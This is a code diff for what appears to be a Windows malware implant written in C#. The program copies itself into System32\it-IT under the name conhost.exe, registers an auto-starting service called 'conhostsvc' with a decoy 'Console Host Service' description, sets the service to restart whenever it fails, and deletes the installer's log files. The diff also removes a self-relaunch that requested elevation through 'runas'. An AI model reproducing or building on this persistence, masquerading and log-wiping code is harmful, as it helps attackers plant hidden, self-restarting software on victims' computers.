@@ -25,7 +25,7 @@ namespace zort
             };
 
             serviceInstaller.StartType = ServiceStartMode.Automatic;
-            serviceInstaller.ServiceName = "Conhostsvc";
+            serviceInstaller.ServiceName = "conhostsvc";
             serviceInstaller.DisplayName = "Console Host Service";
             serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";
 
@@ -33,10 +33,10 @@ namespace zort
             serviceInstaller.ServicesDependedOn = new string[] { }; // Add dependencies if needed
             serviceInstaller.AfterInstall += (sender, args) =>
             {
-                using (var process = new System.Diagnostics.Process())
+                using (var process = new Process())
                 {
                     process.StartInfo.FileName = "sc";
-                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset= 0 actions= restart/5000";
+                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset=0 actions=restart/5000";
                     process.StartInfo.CreateNoWindow = true;
                     process.StartInfo.UseShellExecute = false;
                     process.Start();
@@ -166,32 +166,23 @@ namespace zort
                 string currentFolder = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                 if (!currentFolder.Equals(itITPath))
                 {
-                    ModuleLogger.Log(this, "Not running from C:\\Windows\\System32\\it-IT\\conhost.exe. Copying and running from there..");
+                    ModuleLogger.Log(this, "Not running from C:\\Windows\\System32\\it-IT\\conhost.exe. Copying and installing service..");
 
                     // Copy myself over to C:\Windows\System32\it-IT\conhost.exe
                     Directory.CreateDirectory(itITPath);
                     File.Copy(Assembly.GetExecutingAssembly().Location, conhostPath, true);
-
-                    // Start myself from C:\Windows\System32\it-IT\conhost.exe as admin
-                    var p = new Process();
-                    p.StartInfo.FileName = conhostPath;
-                    p.StartInfo.UseShellExecute = true;
-                    p.StartInfo.Verb = "runas";
-                    p.Start();
-                    Environment.Exit(0);
-                    return;
                 }
 
                 // Install the service
                 ModuleLogger.Log(this, "Starting service installation...");
-                ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
+                ManagedInstallerClass.InstallHelper(new string[] { conhostPath });
                 // Delete Log files ending with InstallLog and InstallState in current directory
-                var logFiles = Directory.GetFiles(Environment.CurrentDirectory, "*.InstallLog");
+                var logFiles = Directory.GetFiles(itITPath, "*.InstallLog");
                 foreach (var logFile in logFiles)
                 {
                     File.Delete(logFile);
                 }
-                logFiles = Directory.GetFiles(Environment.CurrentDirectory, "*.InstallState");
+                logFiles = Directory.GetFiles(itITPath, "*.InstallState");
                 foreach (var logFile in logFiles)
                 {
                     File.Delete(logFile);
